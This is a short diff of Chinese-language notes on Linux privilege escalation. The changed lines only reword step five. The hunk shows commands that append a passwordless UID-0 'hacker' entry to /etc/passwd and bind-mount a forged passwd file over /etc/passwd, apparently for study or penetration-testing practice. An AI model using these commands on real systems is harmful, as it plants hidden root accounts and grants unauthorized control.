@@ -15,6 +15,6 @@ ls -l 命令目录;查看命令目录是否为suid权限
         cat /etc/passwd /tmp/p > /tmp/passwd.new：将密码文件和新增文件写入
         cp /tmp/passwd.new /etc/passwd：将文件复制进去
     添加root用户成功
-5.mount挂载路径将密码文件位置转向自己的文件
-    echo 'hacker::0:0::/root:/bin/bash' > /tmp/p
+5.mount挂载路径：将密码文件位置指向其他文件
+    echo 'hacker::0:0::/root:/bin/bash' > /tmp/p：写入
     mount -o bind /tmp/p /etc/passwd
